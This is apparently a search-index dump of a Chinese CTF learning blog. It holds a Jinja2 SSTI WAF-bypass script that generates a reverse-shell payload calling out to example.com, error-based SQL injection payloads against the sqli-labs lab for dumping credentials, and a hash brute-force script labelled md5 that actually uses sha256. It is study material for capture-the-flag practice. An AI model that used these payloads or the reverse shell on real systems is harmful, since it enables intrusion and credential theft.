[{"title":"amateursctf2024字体文件分析","url":"/2024/04/07/amateursctf2024%E5%AD%97%E4%BD%93%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/","content":"最近做了一下amateursctf的题，其中有一个字体分析的题，从来没做过，一开始拿fontforge打开的这个文件，有点问题，没看出啥，后面看了学长怎么做的，在这里记录一下。\n主要就是有两个字体分析的网页\nhttps://chinese-font.netlify.app/online-split/\nhttps://chinese-font.netlify.app/analyze/\n因为一开始拿到的是.otf后缀的文件，放到第一个网站上分析得到一个包，里面又有一个.woff2的文件，放在第二个网站上分析，就能找到flag了\n","categories":["CTF"],"tags":["web"]},{"title":"jinja2_SSTI全自动绕waf脚本","url":"/2024/04/05/jinja2-SSTI%E5%85%A8%E8%87%AA%E5%8A%A8%E7%BB%95waf%E8%84%9A%E6%9C%AC/","content":"根据WAF函数生成shell指令对应的payloadfrom fenjing import exec_cmd_payload, config_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False    blacklist = [        &quot;config&quot;, &quot;self&quot;, &quot;g&quot;, &quot;os&quot;, &quot;class&quot;, &quot;length&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;lipsum&quot;,        &quot;[&quot;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &quot;_&quot;, &quot;.&quot;, &quot;+&quot;, &quot;~&quot;, &quot;&#123;&#123;&quot;,        &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;,        &quot;０&quot;,&quot;１&quot;,&quot;２&quot;,&quot;３&quot;,&quot;４&quot;,&quot;５&quot;,&quot;６&quot;,&quot;７&quot;,&quot;８&quot;,&quot;９&quot;    ]    return all(word not in s for word in blacklist)if __name__ == &quot;__main__&quot;:    shell_payload, _ = exec_cmd_payload(waf, &quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\\&quot;&quot;)    # config_payload = config_payload(waf)    print(f&quot;&#123;shell_payload=&#125;&quot;)    # print(f&quot;&#123;config_payload=&#125;&quot;)\n\n在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload比如说如果提交的payload被WAF后，WAF页面含有”BAD”这三个字母，那么可以这么写：\nimport functoolsimport timeimport requestsfrom fenjing import exec_cmd_payloadURL = &quot;http://10.137.0.28:5000&quot;@functools.lru_cache(1000)def waf(payload: str):  # 如果字符串s可以通过waf则返回True, 否则返回False    time.sleep(0.02) # 防止请求发送过多    resp = requests.get(URL, timeout=10, params=&#123;&quot;name&quot;: payload&#125;)    return &quot;BAD&quot; not in resp.textif __name__ == &quot;__main__&quot;:    shell_payload, will_print = exec_cmd_payload(        waf, &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1&quot;&#x27;    )    if not will_print:        print(&quot;这个payload不会产生回显！&quot;)    print(f&quot;&#123;shell_payload=&#125;&quot;)\n\n详情请参考https://github.com/Marven11/Fenjing\n","categories":["CTF"],"tags":["SSTI"]},{"title":"Hello World","url":"/2024/03/28/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"my_first_blog","url":"/2024/03/29/my-first-blog/","content":"第一次搭建博客，前前后后不知道用了多长时间，之前一段时间就开始搭建了，但是不知道什么原因网页没有渲染，于是就丢下了这个，最近又重新开始了，在尝试很长时间后，终于给弄出来了，太不容易了，哈哈！\n","categories":["Example"],"tags":["words first"]},{"title":"报错注入","url":"/2024/03/30/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","content":"1.floor函数注入  select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a); http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ union select 1,count(),concat((floor(rand(0)*2)),’–’,(select concat(id,’-‘,username,’-‘,password) from security.users limit 0,1))x from information_schema.tables group by x%23 –SQL注入：floor报错注入的形成原理分析_floor 报错注入-CSDN博客\n\npayload是在中间concat部分，修改该部分可以执行不同命令\n只能用concat连接 ，group_concat不行，且每次只能显示一条数据\n要让上述的报错实现，数据库至少要3条数据\n使用注意\n运用\ncount():查询数量\nrand()：产生0~1间的随机数\nfloor()：向下取整\ngroup by：按指定分类\n函数介绍\n写法\n\n2.extractvalue函数注入\n\n使用注意\nMySQL 5.1.5版本以上才支持该函数\n返回的数据限制为32位\n可以用substring函数进行数据位移偏转 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (extractvalue(1,concat(0x7e,(select substring(group_concat(username),1) from users),0x7e)))–+\n对XML文档进行查询\nEXTRACTVALUE (XML_document, XPath_string);\n第一个参数：XML_document是String格式，为XML文档对象的名称\n第二个参数：XPath_string (Xpath格式的字符串)\n作用：从目标XML中返回包含所查询值的字符串\n函数介绍\n写法 select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n运用 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)))–+\n\n3.updatexml函数注入\n\nMySQL 5.1.5版本以上才支持该函数\n返回的数据限制为32位\n可以用substring函数进行数据位移偏转\n使用注意\n对XML文档进行修改\nUPDATEXML (XML_document, XPath_string, new_value);\n第一个参数：XML_document是String格式，为XML文档对象的名称\n第二个参数：XPath_string (Xpath格式的字符串)\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n作用：改变文档中符合条件的节点的值\n函数介绍\n写法 select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n运用 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (updatexml(1,concat(0x7e,(select SUBSTRING(group_concat(username),12) from users),0x7e),1))–+\n\n4.geometrycollection函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n5.multipoint函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n6.polygon函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n7.multipolygon函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n8.linestring函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n9.multilinestring函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n10.exp函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and exp(~(select * from(select user())a));\n运用\n使用注意\n\n","categories":["CTF"],"tags":["sql注入"]},{"title":"md5脚本","url":"/2024/04/05/md5%E8%84%9A%E6%9C%AC/","content":"import randomimport hashlibdef generate_random_string(length=10):    characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;    random_string = &quot;&quot;    for i in range(length):        random_string += characters[random.randint(0, len(characters) - 1)]    return random_stringinput_str = &quot;&quot;hash_value = &quot;&quot;while True:    input_str = &quot;Warm up&quot; + generate_random_string()    hash_value = hashlib.sha256(input_str.encode(&#x27;utf-8&#x27;)).hexdigest()    if hash_value[:2] == &#x27;0e&#x27;:        breakprint(f&quot;输入: &#123;input_str&#125;&quot;)print(f&quot;哈希值: &#123;hash_value&#125;&quot;)def generate_random_string(length=10):    characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;    random_string = &quot;&quot;    for i in range(length):        random_string += characters[random.randint(0, len(characters) - 1)]    return random_string\n\n这个脚本就是爆破以“warm up”开头的字符串且其md5值以0e开头，以什么开头可以自己修改，主要用于ctf比赛中php md5比较\n","categories":["CTF"],"tags":["md5"]}]